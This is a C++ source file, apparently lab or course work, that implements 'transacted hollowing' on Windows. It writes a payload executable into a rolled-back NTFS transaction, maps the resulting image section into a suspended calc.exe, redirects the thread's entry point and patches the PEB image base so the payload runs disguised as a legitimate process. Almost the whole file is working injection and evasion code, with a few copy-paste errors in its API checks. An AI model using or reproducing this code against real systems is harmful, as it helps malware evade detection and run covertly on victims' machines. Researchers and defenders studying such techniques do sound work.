#include <windows.h>
#include <stdio.h>
#include "tranx.h"

// helper function - GetPayloadBuffer
BYTE* GetPayloadBuffer(OUT size_t& p_size) {
    HANDLE hFile = CreateFileW(L"C:\\Users\\vagrant\\Desktop\\CPIA-Work\\ProcessInjection\\ProcessDoppleganging\\Payload64\\payload64.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        perror("[-] Unable to open the payload file...\n");
        exit(-1);
    }
    p_size = GetFileSize(hFile, 0);
    BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (bufferAddress == NULL) {
        perror("[-] Failed to allocate memory to the payload buffer...\n");
        exit(-1);
    }
    DWORD bytesRead = 0;
    if(!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL)) {
        perror("[-] Failed to read the payload buffer.... \n");
        exit(-1);
    }
    return bufferAddress;
}

HANDLE MakeSectionWithTransaction(BYTE* payload_buffer, DWORD payload_size) {
    HANDLE hTransaction;
    HANDLE hTransactedFile = INVALID_HANDLE_VALUE;
    HANDLE hSection;
    NTSTATUS status;
    DWORD bytesWritten;

    // function decl.
    HMODULE hNtDLLModule = GetModuleHandleA("ntdll.dll");
    if (hNtDLLModule == INVALID_HANDLE_VALUE) {
        perror("[-] Could not open handle to module ntdll... \n");
        exit(-1);
    }
    // resolving requisite apis...
    _NtCreateTransaction pNtCreateTransaction = (_NtCreateTransaction)GetProcAddress(hNtDLLModule, "NtCreateTransaction");
    if (pNtCreateTransaction == NULL) {
        perror("[-] Could not resolve NtCreateTransaction api... \n");
        exit(-1);
    }
    _NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(hNtDLLModule, "NtCreateSection");
    if (pNtCreateTransaction == NULL) {
        perror("[-] Could not resolve NtCreateSection api... \n");
        exit(-1);
    }
    _NtRollbackTransaction pNtRollbackTransaction = (_NtRollbackTransaction)GetProcAddress(hNtDLLModule, "NtRollbackTransaction");
    if (pNtCreateTransaction == NULL) {
        perror("[-] Could not resolve NtRollbackTransaction api... \n");
        exit(-1);
    }
    
    // create ntfs transaction
    _OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    status = pNtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &objAttr, NULL, NULL, 0, 0, 0, NULL, NULL);
    if (!NT_SUCCESS(status)){
        perror("[-] Failed to create transaction object... \n");
        exit(-1);
    }
    printf("[+] Successfully created transaction handle\n");

    // open target file for transaction
    wchar_t targetPath[MAX_PATH];
    lstrcpyW(targetPath, L"C:\\temp\\mynotes.txt");
    hTransactedFile = CreateFileTransactedW(targetPath, GENERIC_READ | GENERIC_WRITE, 0, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
    if (hTransactedFile == INVALID_HANDLE_VALUE) {
        perror("[-] could not open file with transaction object\n");
        exit(-1);
    }
    printf("[+] Opened file for transaction\n");

    // write payload buffer into the transacted file
    if(!WriteFile(hTransactedFile, payload_buffer, payload_size, &bytesWritten, NULL)) {
        perror("[-] Error writing file to the transacted file\n");
        exit(-1);
    }
    printf("[+] Payload written to the transacted file\n");

    // create section from the transacted file
    status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0 , PAGE_READONLY, SEC_IMAGE, hTransactedFile);
    if (!NT_SUCCESS(status)){
        perror("[-] unable to create a section from transacted file\n");
        exit(-1);
    }
    printf("[+] created a section from the transacted file\n");

    // cleanup
    CloseHandle(hTransactedFile);
    hTransactedFile = INVALID_HANDLE_VALUE;

    // rollback the transaction, we just need the section pointing to the payload
    status = pNtRollbackTransaction(hTransaction, TRUE);
    if (!NT_SUCCESS(status)){
        perror("[-] unable to rollback transaction\n");
        exit(-1);
    }
    printf("[+] transaction rolled back\n");
    CloseHandle(hTransaction);
    hTransaction = INVALID_HANDLE_VALUE;

    return hSection;
}

HANDLE CreateSuspendedProcess(PROCESS_INFORMATION &pi){
    LPSTARTUPINFOW sInfo = new STARTUPINFOW();
    sInfo->cb = sizeof(STARTUPINFOW);
    HANDLE hTargetProcess = INVALID_HANDLE_VALUE;
    wchar_t exePath[MAX_PATH];
    lstrcpyW(exePath, L"C:\\Windows\\System32\\calc.exe");
    // Create Process In Suspended Mode
    if (!CreateProcessW(NULL, exePath, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, sInfo, &pi)) {
        perror("[-] Failed To Create Suspended Process.. \n");
        exit(-1);
    }
    wprintf(L"[+] Created Process In Suspended Mode...\n");
    hTargetProcess = pi.hProcess;
    return hTargetProcess;
}

PVOID MapSectionIntoProcess(HANDLE hProcess, HANDLE hSection) {
    NTSTATUS status = STATUS_SUCCESS;
    SIZE_T viewSize = 0;
    PVOID sectionBaseAddress = 0;
    
    // resolving requisite apis
    _NtMapViewOfSection pNtMapViewOfSection = (_NtMapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection");
    if (pNtMapViewOfSection == NULL) {
	    perror("[-] Could not resolve NtMapViewOfSection api\n");
	    exit(-1);
    }
    // mapping section into target process virtual address space
    status = pNtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_READONLY);
    if (!NT_SUCCESS(status)){
        perror("[-] Could not map section to target process\n");
        exit(-1);
    }
    printf("[+] section mapping successful\n");
    printf("[+] section base address: %p\n", sectionBaseAddress);

    return sectionBaseAddress;
}

ULONG_PTR GetPayloadEntryPoint(HANDLE hProcess, PVOID sectionBaseAddress, BYTE* payload_buffer) {
    NTSTATUS status;
    ULONGLONG entrypoint;
    // resolving requisite api
    _RtlImageNTHeader pRtlImageNTHeader = (_RtlImageNTHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
    if (pRtlImageNTHeader == NULL) {
        perror("[-] Failed to resolve RtlImageNTHeader api...\n");
        exit(-1);
    }
    printf("[+] Base address of payload in target process: %p\n", sectionBaseAddress);
    entrypoint = (pRtlImageNTHeader(payload_buffer))->OptionalHeader.AddressOfEntryPoint;
    printf("[+] Address of the entry point inside target process: %p\n", entrypoint);
    entrypoint += (ULONGLONG)sectionBaseAddress;
    printf("[+] Absolute address of the entry point in target process: %p\n", entrypoint);

    return entrypoint;
}

BOOL TransactedHollowing(BYTE* payload_buffer, DWORD payload_size) {
    HANDLE hSection = INVALID_HANDLE_VALUE;
    HANDLE hTargetProcess = INVALID_HANDLE_VALUE;
    PROCESS_BASIC_INFORMATION pbi;
    NTSTATUS status;
    DWORD returnLen = 0;
    ULONGLONG entryPoint;
    PEB* remotePEB;

    // make section with the transacted file
    hSection = MakeSectionWithTransaction(payload_buffer, payload_size);

    _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    if (pNtQueryInformationProcess == NULL) {
        perror("[-] failed to resolve NtQueryInformationProcess api... \n");
        exit(-1);
    }
    // Process Hollowing Part - create a process in suspended state
    PROCESS_INFORMATION pInfo = { 0 };
    hTargetProcess = CreateSuspendedProcess(pInfo);
    if (hTargetProcess == INVALID_HANDLE_VALUE) {
        perror("[-] Failed to create suspended process\n");
        exit(-1);
    }

    // Map section to target process
    PVOID sectionBaseAddress = MapSectionIntoProcess(hTargetProcess, hSection);

    // Query process information
    status = pNtQueryInformationProcess(hTargetProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLen);
    if (!NT_SUCCESS(status)){
        perror("[-] failed to query target process information\n");
        exit(-1);
    }

    // Get payload entrypoint
    entryPoint = GetPayloadEntryPoint(hTargetProcess, sectionBaseAddress, payload_buffer);

    // change control flow by changing entry point
    LPCONTEXT context = new CONTEXT();
    context->ContextFlags = CONTEXT_INTEGER;
    if(!GetThreadContext(pInfo.hThread, context)){
        perror("[-] unable to get the thread context\n");
        exit(-1);
    }
    // change entry point to the payload; x64 - rcx
    context->Rcx = entryPoint;
    if(!SetThreadContext(pInfo.hThread, context)){
        perror("[-] unable to set the thread context\n");
        exit(-1);
    }

    // Get the remote PEB address
    remotePEB = (PEB*)pbi.PebBaseAddress;
    printf("[+] remote peb base addres; %p", remotePEB);
    ULONGLONG imageBaseOffset = sizeof(ULONGLONG) * 2;
    LPVOID remoteImageBase = (LPVOID)((ULONGLONG)remotePEB + imageBaseOffset);
    printf("[+] address of the PEB pointing to image base: %p\n", imageBaseOffset);
    // overwrite the original image base (in our case pointing to calc.exe) to the image base of the pyload64's base
    SIZE_T written = 0;
    if(!WriteProcessMemory(pInfo.hProcess, remoteImageBase, &sectionBaseAddress, sizeof(ULONGLONG), &written)) {
        perror("[-] failed to write to the memory of the target process\n");
        exit(-1);
    }

    printf("[+] updated the image base pointing to our payload: %p", remoteImageBase);

    // Resuming the thread
    ResumeThread(pInfo.hThread);
    printf("[+] Resume thread of suspended process\n");
    return TRUE;
}

int main() {
    size_t payloadSize = 0;
    BYTE* payloadBuffer = GetPayloadBuffer(payloadSize);
    BOOL isSuccess = TransactedHollowing(payloadBuffer, (DWORD)payloadSize);
    system("pause");
}